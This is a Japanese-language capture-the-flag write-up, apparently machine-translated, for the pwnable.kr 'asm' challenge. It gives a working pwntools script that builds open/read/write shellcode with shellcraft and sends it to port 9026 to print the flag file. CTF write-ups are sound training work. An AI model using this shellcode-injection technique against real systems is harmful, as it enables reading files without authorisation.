Asmジョブソリューション


署名asmのアイコンをクリックすると、SSHを介してパスワードguestで接続する必要があることが通知されます。



接続すると、対応するバナーが表示されます。



サーバー上にあるファイルと、私たちが持っている権利を調べてみましょう。



彼らは私たちにreadmeを残しました、それを読んでください。



したがって、フラグファイルを読み取るシェルコードをポート9026に送信する必要があります



。pwntoolsを使用し、接続とアーキテクチャのパラメータを定義します。

from pwn import *

r = remote('pwnable.kr', 9026)

context.arch = 'amd64'

r.interactive()

シェルをコンパイルするには、shellcraftモジュールを使用します。シェルコードの仕組み：

  1. スタック行に入れます-ファイル名。
  2. スタック（rspレジスター）の一番上から名前を付けてファイルを開きます。
  3. open関数はオープンファイル記述子をraxレジスタに返します-読み取る最初のパラメータなので、スタックの64バイトを読み取るため、rspレジスタが2番目のパラメータになります。
  4. 次に、スタックの最上部にあるフラグ（rspレジスター）を標準出力（記述子1）に書き込みます。
  5. 貝殻を集めて発送します。

from pwn import *

r = remote('pwnable.kr', 9026)

context.arch = 'amd64'

payload = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.read('rax', 'rsp', 64)
payload += shellcraft.write(1,'rsp', 64)

shell = asm(payload)

r.send(shell)

r.interactive()
